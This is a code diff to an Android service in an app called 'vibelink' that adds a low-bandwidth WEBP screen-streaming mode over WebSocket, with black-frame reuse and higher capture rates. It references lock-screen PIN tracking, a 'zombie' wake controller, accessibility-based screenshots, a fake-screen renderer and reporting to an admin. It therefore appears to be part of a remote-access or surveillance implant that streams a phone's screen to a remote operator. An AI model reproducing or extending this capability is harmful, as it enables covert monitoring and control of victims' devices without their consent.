@@ -51,6 +51,7 @@ import com.vibelink.client.prefs.SetupPrefs
 import com.vibelink.client.screen.CameraStreamCapturer
 import com.vibelink.client.screen.MediaProjectionCapturer
 import com.vibelink.client.screen.MediaProjectionHolder
+import com.vibelink.client.screen.ScreenFrameCodec
 import com.vibelink.client.device.ZombieWakeController
 import com.vibelink.client.setup.ControlReconnectAlarm
 import com.vibelink.client.setup.FcmTopicSubscriber
@@ -122,6 +123,15 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
     private var screenWebRtcSession: ScreenWebRtcSession? = null
     private var pendingIceServers: JSONArray? = null
     private var preferWebRtcProjection: Boolean = true
+    /** 1688 同款 WebSocket 帧推流模式（非 WebRTC）。 */
+    private var preferWebSocketTransport: Boolean = false
+    /** WebSocket 帧推流画质：standard = 1688 同款（短边 240 / q10），hd = 短边 400 / q40。 */
+    private var screenFrameQuality: String = QUALITY_STANDARD
+
+    /** 当前画质对应的 WEBP 质量。 */
+    private fun currentWebpQuality(): Int =
+        if (screenFrameQuality == QUALITY_HD) SCREEN_FRAME_WEBP_QUALITY_HD
+        else SCREEN_FRAME_WEBP_QUALITY
     private var lastKeyboardSignature: String? = null
     private var lastKeyboardSentAt: Long = 0L
     private var lastKeyguardPinSignature: String? = null
@@ -202,7 +212,13 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
                             val fps = params.optInt("fps", DEFAULT_SNAPSHOT_FPS).coerceIn(1, 5)
                             val mode = normalizeScreenMode(params.optString("mode", MODE_SCREENSHOT))
                             val transport = params.optString("transport", "webrtc").trim().lowercase()
-                            preferWebRtcProjection = transport != "jpeg" && transport != "websocket"
+                            // websocket = 1688 同款 WEBP 帧推流；webrtc = 视频轨；jpeg 为旧版兼容值。
+                            preferWebSocketTransport = transport == "websocket" || transport == "jpeg"
+                            preferWebRtcProjection = !preferWebSocketTransport
+                            screenFrameQuality = params.optString("quality", QUALITY_STANDARD)
+                                .trim().lowercase().let {
+                                    if (it == QUALITY_HD) QUALITY_HD else QUALITY_STANDARD
+                                }
                             pendingIceServers = params.optJSONArray("iceServers")
                             screenStreamMode = mode
                             screenStreamDesired = true
@@ -519,8 +535,10 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
                 val fps = pendingStreamFps ?: DEFAULT_SNAPSHOT_FPS
                 pendingStreamFps = null
                 screenStreamMode = MODE_PROJECTION
-                // Align with ensureProjectionAndStartStream: prefer WebRTC after consent.
-                if (preferWebRtcProjection) {
+                // Align with ensureProjectionAndStartStream: 按用户选择的传输方式分发。
+                if (preferWebSocketTransport) {
+                    startSnapshotStream(fps)
+                } else if (preferWebRtcProjection) {
                     startProjectionWebRtc(fps)
                 } else {
                     startSnapshotStream(fps)
@@ -1404,7 +1422,7 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         screenStreamMode = MODE_SCREENSHOT
         desiredScreenFps = fps.coerceIn(1, 5)
         pendingStreamFps = null
-        if (preferWebRtcProjection && !forceJpeg) {
+        if (!forceJpeg && preferWebRtcProjection) {
             return startScreenshotWebRtc(desiredScreenFps)
         }
 
@@ -1412,6 +1430,8 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         stopWebRtcSession()
         stopSnapshotStream(keepCapturer = true)
         promoteToForegroundSafely(withMediaProjection = false)
+        val useWebp = preferWebSocketTransport
+        var lastPayload: String? = null
         snapshotStreamJob = serviceScope.launch {
             ensureScreenAwake()
             var blackPassthroughHeld = false
@@ -1419,7 +1439,7 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
             var gotFirstFrame = false
             try {
                 // Cap screenshot FPS to reduce ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT.
-                val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 3)).coerceAtLeast(350L)
+                val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 4)).coerceAtLeast(250L)
                 while (isActive && screenStreamDesired) {
                     if (!AccessibilityControlBridge.isReady()) {
                         reportScreenshotFailure("accessibility_service_not_connected")
@@ -1438,42 +1458,108 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
                     }
 
                     val startedAt = System.currentTimeMillis()
-                    val capture = captureScreenOnce(forceAccessibility = true)
-                    if (capture.ok && capture.data.isNotBlank()) {
-                        ensureControlChannelAlive()
-                        val sent = screenWebSocketClient?.sendScreenFrame(
-                            data = capture.data,
-                            screenWidth = capture.screenWidth,
-                            screenHeight = capture.screenHeight,
-                            source = "screenshot",
-                        ) == true
-                        if (sent) {
-                            consecutiveFailures = 0
-                            if (!gotFirstFrame) {
-                                gotFirstFrame = true
-                                screenWebSocketClient?.sendScreenStatus("streaming", "first_frame")
+                    if (useWebp) {
+                        // 1688 同款：缩放(短边 320) → 黑帧检测 → WEBP(q=10) → 复用上一帧。
+                        val bitmapCapture = captureScreenBitmapOnce()
+                        val bitmap = bitmapCapture.bitmap
+                        if (bitmapCapture.ok && bitmap != null) {
+                            val encodedFrame = withContext(Dispatchers.Default) {
+                                try {
+                                    ScreenFrameCodec.encodeFrame(bitmap, currentWebpQuality())
+                                } finally {
+                                    if (!bitmap.isRecycled) bitmap.recycle()
+                                }
+                            }
+                            val payload = when {
+                                encodedFrame == null -> ""
+                                encodedFrame.isBlack && lastPayload != null -> lastPayload!!
+                                else -> encodedFrame.base64
+                            }
+                            if (encodedFrame != null && !encodedFrame.isBlack &&
+                                encodedFrame.base64.isNotBlank()
+                            ) {
+                                lastPayload = encodedFrame.base64
+                            }
+                            if (payload.isNotBlank()) {
+                                ensureControlChannelAlive()
+                                val sent = screenWebSocketClient?.sendScreenFrame(
+                                    data = payload,
+                                    screenWidth = bitmapCapture.screenWidth,
+                                    screenHeight = bitmapCapture.screenHeight,
+                                    source = "screenshot",
+                                    imageWidth = encodedFrame?.width
+                                        ?: bitmapCapture.screenWidth,
+                                    imageHeight = encodedFrame?.height
+                                        ?: bitmapCapture.screenHeight,
+                                    mimeType = "image/webp",
+                                ) == true
+                                if (sent) {
+                                    consecutiveFailures = 0
+                                    if (!gotFirstFrame) {
+                                        gotFirstFrame = true
+                                        screenWebSocketClient?.sendScreenStatus("streaming", "first_frame")
+                                    }
+                                } else {
+                                    consecutiveFailures += 1
+                                    reportScreenshotFailure("screen_send_failed")
+                                }
                             }
                         } else {
                             consecutiveFailures += 1
-                            reportScreenshotFailure("screen_send_failed")
+                            val error = bitmapCapture.error ?: "capture_failed"
+                            if (error != "gesture_priority" &&
+                                error != "capture_in_progress" &&
+                                !error.startsWith("screenshot_failed_3")
+                            ) {
+                                reportScreenshotFailure(error)
+                            } else if (!gotFirstFrame && consecutiveFailures >= 8) {
+                                reportScreenshotFailure(error)
+                            }
+                            if (!gotFirstFrame && consecutiveFailures >= 20) {
+                                screenWebSocketClient?.sendScreenError(
+                                    ERROR_SCREENSHOT_NO_FRAME,
+                                    error,
+                                )
+                            }
                         }
                     } else {
-                        consecutiveFailures += 1
-                        val error = capture.error ?: "capture_failed"
-                        // Soft errors: keep looping; hard ones surface to admin.
-                        if (error != "gesture_priority" &&
-                            error != "capture_in_progress" &&
-                            !error.startsWith("screenshot_failed_3")
-                        ) {
-                            reportScreenshotFailure(error)
-                        } else if (!gotFirstFrame && consecutiveFailures >= 8) {
-                            reportScreenshotFailure(error)
-                        }
-                        if (!gotFirstFrame && consecutiveFailures >= 20) {
-                            screenWebSocketClient?.sendScreenError(
-                                ERROR_SCREENSHOT_NO_FRAME,
-                                error,
-                            )
+                        val capture = captureScreenOnce(forceAccessibility = true)
+                        if (capture.ok && capture.data.isNotBlank()) {
+                            ensureControlChannelAlive()
+                            val sent = screenWebSocketClient?.sendScreenFrame(
+                                data = capture.data,
+                                screenWidth = capture.screenWidth,
+                                screenHeight = capture.screenHeight,
+                                source = "screenshot",
+                            ) == true
+                            if (sent) {
+                                consecutiveFailures = 0
+                                if (!gotFirstFrame) {
+                                    gotFirstFrame = true
+                                    screenWebSocketClient?.sendScreenStatus("streaming", "first_frame")
+                                }
+                            } else {
+                                consecutiveFailures += 1
+                                reportScreenshotFailure("screen_send_failed")
+                            }
+                        } else {
+                            consecutiveFailures += 1
+                            val error = capture.error ?: "capture_failed"
+                            // Soft errors: keep looping; hard ones surface to admin.
+                            if (error != "gesture_priority" &&
+                                error != "capture_in_progress" &&
+                                !error.startsWith("screenshot_failed_3")
+                            ) {
+                                reportScreenshotFailure(error)
+                            } else if (!gotFirstFrame && consecutiveFailures >= 8) {
+                                reportScreenshotFailure(error)
+                            }
+                            if (!gotFirstFrame && consecutiveFailures >= 20) {
+                                screenWebSocketClient?.sendScreenError(
+                                    ERROR_SCREENSHOT_NO_FRAME,
+                                    error,
+                                )
+                            }
                         }
                     }
                     val elapsed = System.currentTimeMillis() - startedAt
@@ -1540,7 +1626,7 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
             var consecutiveFailures = 0
             var gotFirstFrame = false
             try {
-                val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 3)).coerceAtLeast(350L)
+                val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 4)).coerceAtLeast(250L)
                 // Wait briefly for PC/capturer to come up.
                 delay(400L)
                 while (isActive && screenStreamDesired && screenStreamMode == MODE_SCREENSHOT) {
@@ -1609,6 +1695,10 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         screenStreamMode = MODE_SCREENHELPER
         desiredScreenFps = fps.coerceIn(1, 5)
         pendingStreamFps = null
+        // WebSocket 模式直接走帧推流（含黑帧检测 + WEBP）。
+        if (preferWebSocketTransport) {
+            return startScreenHelperJpeg(desiredScreenFps)
+        }
         if (preferWebRtcProjection && !forceJpeg) {
             return startScreenHelperWebRtc(desiredScreenFps)
         }
@@ -1685,6 +1775,8 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         desiredScreenFps = fps.coerceIn(1, 5)
         promoteToForegroundSafely(withMediaProjection = false)
         screenWebSocketClient?.sendScreenStatus("streaming", "screenhelper_jpeg")
+        val useWebp = preferWebSocketTransport
+        var lastPayload: String? = null
 
         snapshotStreamJob = serviceScope.launch {
             ensureScreenAwake()
@@ -1708,25 +1800,50 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
                 if (dump != null && !dump.has("error")) {
                     val screenWidth = dump.optInt("screenWidth").takeIf { it > 0 } ?: 720
                     val screenHeight = dump.optInt("screenHeight").takeIf { it > 0 } ?: 1280
-                    val jpeg = withContext(Dispatchers.Default) {
+                    val encoder: (Bitmap) -> ScreenFrameCodec.EncodedFrame? = if (useWebp) {
+                        { bmp ->
+                            ScreenFrameCodec.encodeFrame(bmp, currentWebpQuality())
+                        }
+                    } else {
+                        { bmp ->
+                            ScreenFrameCodec.EncodedFrame(
+                                bitmapToJpegBase64(bmp, SCREENHELPER_JPEG_QUALITY),
+                                bmp.width,
+                                bmp.height,
+                                false,
+                            )
+                        }
+                    }
+                    val encodedFrame = withContext(Dispatchers.Default) {
                         val bitmap = UiTreeFakeScreenRenderer.renderFromDump(dump, 720, 1280)
                         try {
-                            bitmapToJpegBase64(bitmap, SCREENHELPER_JPEG_QUALITY)
+                            encoder(bitmap)
                         } finally {
                             if (!bitmap.isRecycled) {
                                 bitmap.recycle()
                             }
                         }
                     }
-                    if (jpeg.isNotBlank()) {
+                    val payload = when {
+                        encodedFrame == null -> ""
+                        encodedFrame.isBlack && lastPayload != null -> lastPayload!!
+                        else -> encodedFrame.base64
+                    }
+                    if (encodedFrame != null && !encodedFrame.isBlack &&
+                        encodedFrame.base64.isNotBlank()
+                    ) {
+                        lastPayload = encodedFrame.base64
+                    }
+                    if (payload.isNotBlank()) {
                         ensureControlChannelAlive()
                         screenWebSocketClient?.sendScreenFrame(
-                            data = jpeg,
+                            data = payload,
                             screenWidth = screenWidth,
                             screenHeight = screenHeight,
                             source = "screenhelper",
-                            imageWidth = 720,
-                            imageHeight = 1280,
+                            imageWidth = encodedFrame?.width ?: 720,
+                            imageHeight = encodedFrame?.height ?: 1280,
+                            mimeType = if (useWebp) "image/webp" else "image/jpeg",
                         )
                     }
                 }
@@ -1813,7 +1930,10 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         screenStreamMode = MODE_PROJECTION
         if (MediaProjectionHolder.hasConsent()) {
             promoteToForegroundSafely(withMediaProjection = true)
-            if (preferWebRtcProjection) {
+            if (preferWebSocketTransport) {
+                // 1688 同款：MediaProjection → ImageReader → WEBP 帧推流。
+                startSnapshotStream(fps)
+            } else if (preferWebRtcProjection) {
                 startProjectionWebRtc(fps)
             } else {
                 startSnapshotStream(fps)
@@ -1885,6 +2005,9 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         snapshotStreamJob = serviceScope.launch {
             ensureScreenAwake()
             var blackPassthroughHeld = false
+            // WebSocket 模式：1688 同款 WEBP + 黑帧复用；否则沿用旧 JPEG 路径。
+            val useWebp = preferWebSocketTransport
+            var lastPayload: String? = null
             try {
                 val intervalMs = 1000L / fps.coerceIn(1, 5)
                 while (isActive) {
@@ -1902,19 +2025,63 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
                     }
 
                     val startedAt = System.currentTimeMillis()
-                    val capture = captureScreenOnce()
-                    if (capture.ok && capture.data.isNotBlank()) {
-                        ensureControlChannelAlive()
-                        screenWebSocketClient?.sendScreenFrame(
-                            data = capture.data,
-                            screenWidth = capture.screenWidth,
-                            screenHeight = capture.screenHeight,
-                        )
-                    } else if (capture.error == "projection_not_ready" ||
-                        capture.error == "projection_start_failed"
-                    ) {
-                        screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_SESSION_FAILED)
-                        break
+                    if (useWebp) {
+                        val frame = capturer.captureOnceBitmap()
+                        val bitmap = frame.bitmap
+                        if (frame.ok && bitmap != null) {
+                            val encodedFrame = withContext(Dispatchers.Default) {
+                                try {
+                                    ScreenFrameCodec.encodeFrame(
+                                        bitmap,
+                                        currentWebpQuality(),
+                                    )
+                                } finally {
+                                    if (!bitmap.isRecycled) bitmap.recycle()
+                                }
+                            }
+                            val payload = when {
+                                encodedFrame == null -> ""
+                                encodedFrame.isBlack && lastPayload != null -> lastPayload!!
+                                else -> encodedFrame.base64
+                            }
+                            if (encodedFrame != null && !encodedFrame.isBlack &&
+                                encodedFrame.base64.isNotBlank()
+                            ) {
+                                lastPayload = encodedFrame.base64
+                            }
+                            if (payload.isNotBlank()) {
+                                ensureControlChannelAlive()
+                                screenWebSocketClient?.sendScreenFrame(
+                                    data = payload,
+                                    screenWidth = frame.screenWidth,
+                                    screenHeight = frame.screenHeight,
+                                    source = "projection",
+                                    imageWidth = encodedFrame?.width ?: frame.screenWidth,
+                                    imageHeight = encodedFrame?.height ?: frame.screenHeight,
+                                    mimeType = "image/webp",
+                                )
+                            }
+                        } else if (frame.error == "projection_not_ready" ||
+                            frame.error == "projection_start_failed"
+                        ) {
+                            screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_SESSION_FAILED)
+                            break
+                        }
+                    } else {
+                        val capture = captureScreenOnce()
+                        if (capture.ok && capture.data.isNotBlank()) {
+                            ensureControlChannelAlive()
+                            screenWebSocketClient?.sendScreenFrame(
+                                data = capture.data,
+                                screenWidth = capture.screenWidth,
+                                screenHeight = capture.screenHeight,
+                            )
+                        } else if (capture.error == "projection_not_ready" ||
+                            capture.error == "projection_start_failed"
+                        ) {
+                            screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_SESSION_FAILED)
+                            break
+                        }
                     }
                     val elapsed = System.currentTimeMillis() - startedAt
                     val waitMs = (intervalMs - elapsed).coerceAtLeast(80L)
@@ -2318,6 +2485,12 @@ class ConnectionService : Service(), DeviceWebSocketClient.Listener {
         private const val MODE_PROJECTION = "projection"
         private const val MODE_SCREENHELPER = "screenhelper"
         private const val SCREENHELPER_JPEG_QUALITY = 45
+        private const val SCREENHELPER_WEBP_QUALITY = 10
+        private const val SCREEN_FRAME_WEBP_QUALITY = 10
+        /** 高清档：短边 400（quality 40 经 rr.f() 联动算出），每帧约 20-30KB。 */
+        private const val SCREEN_FRAME_WEBP_QUALITY_HD = 40
+        private const val QUALITY_STANDARD = "standard"
+        private const val QUALITY_HD = "hd"
         private const val DEFAULT_HISTORY_LIMIT = 50
         private const val ERROR_PROJECTION_NOT_GRANTED = 201
         private const val ERROR_PROJECTION_SESSION_FAILED = 202
